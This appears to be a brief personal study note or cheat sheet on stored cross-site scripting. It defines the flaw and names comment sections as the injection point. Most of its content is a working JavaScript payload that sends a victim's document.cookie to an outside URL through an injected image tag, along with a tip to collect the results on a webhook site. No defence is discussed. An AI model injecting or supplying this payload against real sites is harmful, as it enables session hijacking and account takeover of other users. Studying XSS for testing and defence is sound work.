### Stored XSS

---

- Stored XSS happens when the data received is stored in HTTP responses in an unsafe way
- Comment section
- Same payloads


#### Stealing cookies

```js
<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>
```

Use `webhook site` to view the responses


